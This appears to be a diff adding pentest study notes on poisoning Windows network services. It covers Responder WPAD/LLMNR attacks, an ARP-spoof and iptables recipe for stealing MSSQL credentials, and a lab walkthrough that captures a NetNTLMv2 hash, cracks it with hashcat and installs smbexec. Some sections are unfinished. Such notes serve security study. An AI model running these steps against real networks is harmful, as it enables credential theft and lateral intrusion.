+https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf
+
+https://www.offensive-security.com/metasploit-unleashed/Mimikatz
+
+
+
+
+
+Exploitable services
+====================
+
+WPAD
+----
+
+`Responder`_ can exploit Window's broadcast attempts autodiscover a WPAD server, becoming a man-in-the middle by replacing the legitimate web proxy server. From `Responder`_:
+
+  WPAD rogue transparent proxy server. This module will capture all HTTP requests from anyone launching Internet Explorer on the network. This module is higly effective. You can now send your custom Pac script to a victim and inject HTML into the server's responses. See Responder.conf. This module is now enabled by default.
+
+
+`WPAD Man in the Middle (Clear Text Passwords) <https://www.trustedsec.com/july-2013/wpad-man-in-the-middle-clear-text-passwords/>`_ and `Hacking Clients with WPAD (Web Proxy Auto-Discovery) Protocol <http://resources.infosecinstitute.com/hacking-clients-wpad-web-proxy-auto-discovery-protocol/>`_. describe how to accomplish the WPAD `Responder`_ exploit.
+
+If you're not familiar with WPAD, from `Wikipedia Web Proxy Autodiscovery Protocol <http://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol>`_:
+
+  The Web Proxy Auto-Discovery Protocol (WPAD) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL. The WPAD protocol only outlines the mechanism for discovering the location of this file, but the most commonly deployed configuration file format is the `proxy auto-config <http://en.wikipedia.org/wiki/Proxy_auto-config>`_ format originally designed by Netscape in 1996 for Netscape Navigator 2.0.
+
+If you're not familiar with PAC, from `Wikipedia Proxy auto-config <http://en.wikipedia.org/wiki/Proxy_auto-config>`_:
+
+  A proxy auto-config (PAC) file defines how web browsers and other user agents can automatically choose the appropriate proxy server (access method) for fetching a given URL.
+
+  A PAC file contains a JavaScript function “FindProxyForURL(url, host)”. This function returns a string with one or more access method specifications. These specifications cause the user agent to use a particular proxy server or to connect directly.
+
+  Multiple specifications provide a fall-back when a proxy fails to respond. The browser fetches this PAC file before requesting other URLs. The URL of the PAC file is either configured manually or determined automatically by the Web Proxy Autodiscovery Protocol.
+
+MSSQL
+-----
+
+From `MSSQL MITM FTW - Ettercap and Responder to Intercept (plaintext!) MSSQL Creds <http://breenmachine.blogspot.com/2014/12/mssql-mitm-ftw-ettercap-and-responder.html>`_:
+
+  The first step was to identify the SQL server and setup Ettercap to ARP spoof traffic between the SQL server and the gateway. Easy enough - now the SQL server traffic is flowing through our machine.
+
+  Next we run Responder.py and have it enable it's SQL Server authentication listener. This spins up a "fake" SQL server that will log any credentials sent to it.
+
+  Finally - a simple IPTables rule to redirect traffic bound for the real DBMS to the listener running on our machine "iptables -t nat -A PREROUTING -p tcp --dport 1433 -j REDIRECT --to-ports 1433". This will break things. Any connections to the DBMS that are currently open will probably break, the client will try to re-authentication, we'll catch the creds.
+
+  SQL Server can then be used to pivot into the network/domain with xp_cmdshell, extract sensitive data etc...
+
+Another approach is described in `Wendel's Small Hacking Tricks - Microsoft SQL Server Edition <https://www.trustwave.com/Resources/SpiderLabs-Blog/Wendel-s-Small-Hacking-Tricks---Microsoft-SQL-Server-Edition/>`_.
+
+FTP, HTTP, IMAP, Kerberos, LDAP, POP3, SMTP
+-------------------------------------------
+
+Similar exploits exist for FTP, HTTP, IMAP, Kerberos, LDAP, POP3, and SMTP. We leave these as an exercise for the reader.
+
+SMB
+---
+
+SMB Protocol
+^^^^^^^^^^^^
+
+SMB (`Server Message Block <http://en.wikipedia.org/wiki/Server_Message_Block>`_) is the layer 6 remote file network protocol that originally used the NetBIOS API (over a variety of protocols) but can skip directly to TCP:
+
+  Using the NetBIOS API over a variety of protocols:
+    NBF - NetBIOS Frames protocol.
+      The legacy (pre-TCP) communication.
+
+    NBT - NetBIOS over TCP
+      UDP port 137 = NetBIOS Name Service (NBNS) WINS
+
+      UDP port 138 = NBT Datagram broadcasts
+
+      TCP port 139 = NetBIOS Session Service (NBT sessions)
+
+  Since Windows 2000, skipping the NetBIOS API and using TCP directly:
+    SMB Direct (since Windows 2000)
+      TCP port 445 = "direct host SMB" skips NetBIOS protocol altogether
+
+NetBIOS was developed for IBM in 1983 and in 1987 Microsoft announced LAN Manager which ran natively over NBF. In 1988 Microsoft and Intel announced the SMB Core Protocol. Windows 2000 introduced SMB direct, which skipped the NetBIOS API and used TCP directly. You may hear of the term CIFS (Common Internet File System), but `SMB remote file protocol <https://www.eiseverywhere.com/file_uploads/b4f7436c4bc86fe545abe9fc042d4a7f_JoseBarreto_SMB3_Remote_File_Protocol_revision.pdf>`_ indicates "CIFS means SMB as it existed in Windows NT 4", "However, the term “CIFS” is commonly used incorrectly to refer to more recent versions of SMB like SMB2, SMB2.1 or SMB3". So we use SMB instead of the term CIFS.
+
+Here is a summary of the SMB versions loosely adopted from `3.3 An Introduction to SMB/CIFS <http://www.oreilly.com/openbook/samba/book/ch03_03.html>`_ and extended for more recent versions:
+
+.. csv-table:: SMB Protocol Dialects
+  :header: "Protocol Name", "Used By"
+  :widths: 35, 26
+
+  "Core (PC NETWORK PROGRAM 1.0)"
+  "Core Plus (MICROSOFT NETWORKS 1.03)"
+  "LAN Manager 1.0 (LANMAN1.0)"
+  "LAN Manager 2.0 (LM1.2X002)"
+  "LAN Manager 2.1 (LANMAN2.1)"
+  "NT LAN Manager 1.0 (NT LM 0.12)", "Windows NT 4.0"
+  "Samba's NT LM 0.12 (Samba)", "Samba"
+  "SMB 1", "Windows 2000"
+  "SMB 2", "Windows Vista"
+  "SMB 2.1", "Windows 7, Server 2008R2"
+  "SMB 3", "Windows 8, Server 2012"
+  "SMB 3.02", "Windows 8.1, Server 2012R2"
+  "SMB 3.10", "Windows 10"
+
+
+Exploits
+^^^^^^^^
+
+From `Scenario-based pen-testing: From zero to domain admin with no missing patches required <http://www.computerworld.com/article/2843632/security0/scenario-based-pen-testing-from-zero-to-domain-admin-with-no-missing-patches-required.html>`_:
+
+This takes advantage of the following shortcomings:
+
+* Password hashes are not salted, but NTLM challenges are salted with a nonce.
+
+  From Wikipedia, `Salt <http://en.wikipedia.org/wiki/Salt_%28cryptography%29>`_:
+
+    "salt is random data that is used as an additional input to a one-way function that hashes a password or passphrase".
+
+  From Wikipedia, `LM hash <http://en.wikipedia.org/wiki/LM_hash>`_:
+
+    For hashing, NTLM uses Unicode support, replacing LMhash=DESeach(DOSCHARSET(UPPERCASE(password)), "KGS!@#$%") by NThash=MD4(UTF-16-LE(password)).
+
+  So then the hash from a server remains static until the password is next changed. From Wikipedia `Pass the hash <http://en.wikipedia.org/wiki/Pass_the_hash>`_:
+
+    On systems/services using NTLM authentication, users' passwords are never sent in cleartext over the wire. Instead, they are provided to the requesting system, such as a domain controller, as a hash in a response to a challenge-response authentication scheme.
+
+    Native Windows applications ask users for the cleartext password, then call APIs like LsaLogonUser that convert that password to one or two hash values (the LM and/or NT hashes) and then send that to the remote server during NTLM authentication. Analysis of this mechanism has shown that the cleartext password is not required to complete network authentication successfully, only the hashes are needed.
+
+    If an attacker has the hashes of a user's password, they do not need to brute-force the cleartext password; they can simply use the hash of an arbitrary user account that they have harvested and execute a side channel attack to authenticate against a remote system and impersonate that user. In other words, from an attacker's perspective, hashes are functionally equivalent to the original passwords that they were generated from.
+
+This exploit uses the following steps:
+
+#. Start up Responder with HTTP & SMB responders waiting for LLMNR & NBT-NS poisoning to capture NETNTLM hashes.
+
+#. Use :program:`hashcat` is used to brute force the NETNTLM hash.
+
+   The NETNTLM hashes are not useful for pass-the-hash.
+
+#. Run :program:`smbexec` using the captured credentials to log into machines looking for additional password hashes or plaintext passwords in memory. :program:`smbexec` uses the 
+
+.. todo:: why aren't NETNTLM hashes useful for pass-the-hash?
+
+First start up responder on Kali:
+
+.. code-block:: bash
+  :emphasize-lines: 3,5
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  MYIP=192.168.1.104
+  ss -tnl
+  $SUDO responder -i $MYIP -w -F
+
+On the Windows box, flush the DNS cache via ``ipconfig /flushdns``, fire up IE & verify :menuselection:`Internet Options --> Connections --> LAN Settings` is checked, then visit a site.
+
+.. code-block:: batch
+  :emphasize-lines: 1
+
+  ipconfig /flushdns
+  REM Now fire up IE and browse to a site.
+  REM This works when IE --> Internet Options --> Connections -->
+  REM   LAN Settings is "Automatically detect settings" is checked.
+
+Back on Kali Linux you should first see a poisoned request for :file:`/wpad.dat` followed by a NetNTLMv2 hash captured:
+
+.. code-block:: console
+  :emphasize-lines: 3,6,15-16,18-19,35-38
+
+  hacker@kali:~$ SUDO=$(which sudo)
+  hacker@kali:~$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~$ MYIP=192.168.1.104
+  hacker@kali:~$ ss -tnl
+  State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
+  hacker@kali:~/local/pentest/lethal/responder$ $SUDO responder -i $MYIP -w -F
+  NBT Name Service/LLMNR Responder 2.0.
+  Please send bugs/comments to: lgaffie@trustwave.com
+  To kill this script hit CRTL-C
+
+  [+]NBT-NS, LLMNR & MDNS responder started
+  [+]Loading Responder.conf File..
+  Global Parameters set:
+  Responder is bound to this interface: ALL
+  Challenge set: 1122334455667788
+  WPAD Proxy Server: True
+  WPAD script loaded:  function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
+  HTTP Server: ON
+  HTTPS Server: ON
+  SMB Server: ON
+  SMB LM support: False
+  Kerberos Server: ON
+  SQL Server: ON
+  FTP Server: ON
+  IMAP Server: ON
+  POP3 Server: ON
+  SMTP Server: ON
+  DNS Server: ON
+  LDAP Server: ON
+  FingerPrint hosts: False
+  Serving Executable via HTTP&WPAD: OFF
+  Always Serving a Specific File via HTTP&WPAD: OFF
+
+
+  LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.
+  [+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat 
+  [+]HTTP NTLMv2 hash captured from : 192.168.1.103
+  Complete hash is :  jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000
+  ###################### SNIP ######################
+
+Since the NetNTLMv2 hash is salted it can't be used for "pass-the-hash" but we can try to crack it with :program:`hashcat` in another terminal session:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,10,12-13,15-16
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  PASSWORD=password
+  T=192.168.1.103
+  # copy captured NetNTLMv2 hashes to hashes.txt
+  #   format = USER::DOMAIN:NONCE:NTLMV2HASH:RESPONSE
+  #      USER = user id
+  #      DOMAIN = account database (DOMAIN or SAM)
+  #      NONCE = challenge
+  #      NTLMV2HASH = HMAC-MD5 hash
+  #      RESPONSE = entire NTLMv2 response except for NTLMV2HASH
+  cp /usr/share/responder/HTTP-NTLMv2-Client-$T.txt hashes.txt
+  # add the actual password to rockyou.txt if not already there
+  echo "$PASSWORD" > words.txt
+  zcat /usr/share/wordlists/rockyou.txt.gz >> words.txt
+  # crack NetNTLMv2 hash = 5600
+  $SUDO hashcat --hash-type=5600 --potfile-disable hashes.txt words.txt \
+      | tee cracked.txt
+
+Running this gives us our cracked password:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,10,12-13,15-16,18,26
+
+  hacker@kali:~$ SUDO=$(which sudo)
+  hacker@kali:~$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~$ PASSWORD=password
+  hacker@kali:~$ T=192.168.1.103
+  hacker@kali:~$ # copy captured NetNTLMv2 hashes to hashes.txt
+  hacker@kali:~$ #   format = USER::DOMAIN:NONCE:NTLMV2HASH:RESPONSE
+  hacker@kali:~$ #      USER = user id
+  hacker@kali:~$ #      DOMAIN = account database (DOMAIN or SAM)
+  hacker@kali:~$ #      NONCE = challenge
+  hacker@kali:~$ #      NTLMV2HASH = HMAC-MD5 hash
+  hacker@kali:~$ #      RESPONSE = entire NTLMv2 response except for NTLMV2HASH
+  hacker@kali:~$ cp /usr/share/responder/HTTP-NTLMv2-Client-$T.txt hashes.txt
+  hacker@kali:~$ # add the actual password to rockyou.txt if not already there
+  hacker@kali:~$ echo "$PASSWORD" > words.txt
+  hacker@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz >> words.txt
+  hacker@kali:~$ # crack NetNTLMv2 hash = 5600
+  hacker@kali:~$ $SUDO hashcat --hash-type=5600 --potfile-disable hashes.txt words.txt \
+  >     | tee cracked.txt
+  ###################### SNIP ######################
+  hacker@kali:~$ cat cracked.txt 
+  Initializing hashcat v0.49 with 1 threads and 32mb segment-size...
+
+  Added hashes from file hashes.txt: 1 (1 salts)
+  Activating quick-digest mode for single-hash with salt
+
+  NOTE: press enter for status-screen
+
+  JGM::taxing:1122334455667788:be429406642bf55e51748a867acdd409:010100000000000042a43e2c048ed00113456a9d55b36a4e000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c0008003000300000000000000001000000001000005436c9ccc131c3a88d569e3a3cad25e1882d24e33f82cb960f8c6809d4139d3f0a001000000000000000000000000000000000000900240048005400540050002f003100390032002e003100360038002e0031002e003100300034000000000000000000:password
+
+  All hashes have been recovered
+
+  Input.Mode: Dict (words.txt)
+  Index.....: 1/5 (segment), 3625424 (words), 33550337 (bytes)
+  Recovered.: 1/1 hashes, 1/1 salts
+  Speed/sec.: - plains, - words
+  Progress..: 4/3625424 (0.00%)
+  Running...: --:--:--:--
+  Estimated.: --:--:--:--
+
+  Started: Wed May 13 22:15:26 2015
+  Stopped: Wed May 13 22:15:26 2015
+  ###################### SNIP ######################
+
+
+Now want to run `smbexec <https://github.com/pentestgeek/smbexec>`_
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  INSTALL_DIR="/usr/local/bin"
+  cd $INSTALL_DIR
+  $SUDO git clone https://github.com/pentestgeek/smbexec.git smbexec.git
+  cd smbexec.git
+  $SUDO ./install.sh
+
+
+
+
+
+`Local Network Attacks: LLMNR and NBT-NS Poisoning <http://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning>`_
+
+`SMB Attacks Through Directory Traversal <https://blog.netspi.com/smb-attacks-through-directory-traversal/>`_
+
+`Effective NTLM / SMB Relaying <http://www.room362.com/blog/2014/05/21/effective-ntlm-slash-smb-relaying/>`_
+
+`Refresher Series - Capturing and cracking SMB hashes with Cain and Half-LM rainbow tables <http://www.infosecisland.com/blogview/22807-Refresher-Series-Capturing-and-cracking-SMB-hashes-with-Cain-and-Half-LM-rainbow-tables.html>`_
+
+
+
+
+
+
+
+`Attacking LM/NTLMv1 Challenge/Response Authentication <http://www.defenceindepth.net/2011/04/attacking-lmntlmv1-challengeresponse_21.html>`_
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+`nmap smb-enum-users <http://nmap.org/nsedoc/scripts/smb-enum-users.html>`_
+
+`enum4linux <https://labs.portcullis.co.uk/tools/enum4linux/>`_
+
+HTML injection
+
+forced NTLM auth for wpad.dat file retrieval
+
+SMBRelay - relay selected account credentials to target systems & run command
+
+analyze mode - no poisoned responses
+
+
+WPAD description in `Responder 2.0 - Owning Windows Networks part 3  <http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html>`_
+
+SMB Relay Modules as in ^^^^^
+
+stealthiness
+
+ICMP redirect
+
+Windows =< 5.2 Domainmembers (XP, Windows server 2003 and above) have ICMP Redirectenabled by default. This functionality can be used to remotely add(with no authentication required) a new route for a given host. Yes,you heard me right.
+
+
+
+`How to Get Less Findings on Your Next Internal Penetration Test <http://www.pciqsatalk.com/disable-llmnr-netbios/>`_
+
+`Local Network Vulnerabilities - LLMNR and NBT-NS Poisoning <http://www.surecloud.com/newsletter/local-network-vulnerabilities-llmnr-and-nbt-ns-poisoning>`_
+
+
+
